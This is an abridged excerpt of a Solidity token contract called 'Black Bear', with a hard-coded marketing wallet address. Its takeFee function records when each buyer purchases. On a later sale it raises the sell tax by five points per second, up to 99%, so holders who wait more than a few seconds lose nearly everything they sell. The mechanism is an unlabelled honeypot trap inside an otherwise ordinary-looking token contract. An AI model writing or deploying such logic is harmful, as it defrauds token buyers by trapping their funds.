...
contract Blackbear is Context, IERC20, Ownable {
    ...
    string private _name = "Black Bear";
    string private _symbol = "Blackbear";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
    payable(0x72Ebfab0d21C000D7D9f9Cb630BBE8c31519e810);
    ...
    mapping(address => uint256) private _timeMap;
    ...
    function takeFee(
        ...
        if (isMarketPair[sender]) {
            ...
            _timeMap[recipient] = block.timestamp;
        } else if (isMarketPair[recipient]) {
            uint256 tv = _timeMap[sender];
            uint256 tf = _totalTaxIfSelling;
            if (tv > 0 && block.timestamp - tv > 4) {
                tf = (block.timestamp - tv - 3) * 5;
                if (tf > 99) {
                    tf = 99;
                }
            }
            feeAmount = amount.mul(tf).div(100);
            address ad;
